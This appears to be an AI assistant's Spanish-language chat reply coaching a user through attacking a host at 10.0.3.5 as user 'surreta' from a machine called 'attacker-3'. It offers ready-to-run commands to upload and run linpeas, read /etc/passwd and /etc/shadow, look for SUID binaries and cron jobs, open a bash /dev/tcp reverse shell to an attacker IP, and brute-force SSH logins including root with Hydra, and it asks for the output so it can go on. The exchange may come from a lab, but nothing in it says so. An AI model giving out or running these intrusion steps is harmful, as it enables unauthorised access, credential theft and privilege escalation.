¡Excelente pregunta! Veo que `surreta` no puede ejecutar `sudo`. Pero **NO es el fin**. Tenemos varias alternativas.

---

## 🔓 Alternativas para acceder/cargar archivos

### 1. **Transferir archivos a la víctima (desde attacker-3)**

Como `surreta` no tiene shell interactivo, pero **SSH ejecuta comandos**, podemos usar `scp` o redirecciones.

#### Opción A: Usar `scp` para subir archivos
```bash
# Desde attacker-3, subir un script o binario
scp linpeas.sh surreta@10.0.3.5:/tmp/
```

**Si funciona**, luego ejecutamos:
```bash
ssh surreta@10.0.3.5 "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
```

#### Opción B: Usar `echo` y redirección (crear archivo línea por línea)
```bash
ssh surreta@10.0.3.5 "echo '#!/bin/bash' > /tmp/script.sh"
ssh surreta@10.0.3.5 "echo 'id' >> /tmp/script.sh"
ssh surreta@10.0.3.5 "chmod +x /tmp/script.sh && /tmp/script.sh"
```

#### Opción C: Usar `base64` para subir binarios (evita caracteres especiales)
```bash
# En attacker-3, codificar linpeas
base64 -w 0 linpeas.sh > linpeas_b64.txt

# Copiar el contenido y decodificar en la víctima
ssh surreta@10.0.3.5 "echo 'BASE64_CONTENIDO_AQUI' | base64 -d > /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
```

---

### 2. **Explotar falta de restricciones en comandos SSH**

Si `surreta` tiene un shell restringido pero puede ejecutar comandos específicos, probá:

```bash
# Ver qué comandos puede ejecutar (si hay restricción)
ssh surreta@10.0.3.5 "ls -la /usr/bin"
ssh surreta@10.0.3.5 "find / -perm -4000 2>/dev/null"
ssh surreta@10.0.3.5 "cat /etc/passwd"
ssh surreta@10.0.3.5 "cat /etc/shadow"  # improbable pero probá
```

---

### 3. **Buscar archivos SUID (Set User ID) ejecutables por `surreta`**

Este es el vector MÁS COMÚN para escalar de usuario limitado a root.

```bash
ssh surreta@10.0.3.5 "find / -user root -perm -4000 -exec ls -ld {} \; 2>/dev/null"
```

**Si encontrás algo como `/usr/bin/sudo`, `/bin/su`, `/usr/bin/pkexec`**, podemos explotarlo.

---

### 4. **Revisar tareas cron (programadas) que ejecute root**

```bash
ssh surreta@10.0.3.5 "cat /etc/crontab"
ssh surreta@10.0.3.5 "ls -la /etc/cron*"
ssh surreta@10.0.3.5 "systemctl list-timers --all --no-pager"  # si tiene permisos
```

---

### 5. **Intentar abrir una reverse shell (si hay conectividad)**

Desde la víctima hacia `attacker-3`:

```bash
# En attacker-3, ponerte en escucha
nc -lvnp 4444

# Desde tu máquina local, ejecutar:
ssh surreta@10.0.3.5 "bash -c 'exec bash -i &>/dev/tcp/<IP_ATTACKER>/4444 <&1'"
```

Si la reverse shell funciona, **tendrás una shell interactiva como `surreta`** y podrás explorar mejor.

---

### 6. **Ataque de fuerza bruta a otros usuarios (incluyendo root)**

Si `surreta` no sirve, quizás otro usuario **sí** tiene shell. Usá Hydra nuevamente pero con una lista más amplia:

```bash
# Probar usuarios comunes en sistemas Ubuntu
cat > usuarios_comunes.txt << EOF
root
sys
bin
daemon
adm
lp
sync
shutdown
halt
mail
operator
games
ftp
nobody
systemd-network
sshd
surreta
EOF

hydra -L usuarios_comunes.txt -P dic.txt ssh://10.0.3.5 -t 4 -V -f
```

---

## 🎯 Mi recomendación inmediata

**Probá estos 3 comandos ahora y pegá la salida:**

```bash
# 1. Buscar SUID
ssh surreta@10.0.3.5 "find / -perm -4000 2>/dev/null"

# 2. Ver si puede leer /etc/passwd
ssh surreta@10.0.3.5 "cat /etc/passwd | grep -E '/bin/bash|/bin/sh'"

# 3. Intentar subir linpeas (si scp funciona)
scp /usr/local/bin/linpeas.sh surreta@10.0.3.5:/tmp/
```

Si `scp` no funciona, usamos `base64`. Si nada funciona, hacemos **reverse shell**.

**¿Qué te devuelven esos comandos?** Así ajustamos el tiro.